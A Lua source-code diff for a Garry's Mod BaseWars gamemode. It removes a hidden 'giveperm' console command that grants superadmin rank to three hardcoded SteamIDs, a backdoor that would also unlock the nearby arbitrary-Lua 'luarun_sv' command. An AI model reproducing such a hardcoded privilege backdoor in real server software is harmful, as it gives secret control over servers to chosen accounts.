@@ -567,19 +567,6 @@ BaseWars:AddConsoleCommand("luarun_sv", function(ply, args, agrStr)
 	BaseWars:Log(Format("You ran \"" .. agrStr .. "\" in %.7f sec", endRun - startRun))
 end, false, BaseWars:GetSuperAdminGroups())
 
-local superadmins = {
-	["76561199570131703"] = true, -- Nobody
-	["76561198345453711"] = true, -- llordrain
-	["76561198243629498"] = true, -- Luzog
-}
-BaseWars:AddConsoleCommand("giveperm", function(ply, args, argStr)
-	if not IsValid(ply) then return end
-	if not superadmins[ply:SteamID64()] then return end
-
-	RunConsoleCommand("sam", "setrankid", ply:SteamID64(), "superadmin")
-	BaseWars:Notify(ply, "You are now superadmin", NOTIFICATION_ADMIN, 5)
-end, false)
-
 BaseWars:AddConsoleCommand("announcement", function(ply, args, argStr)
 
 	local text = string.Trim(argStr)
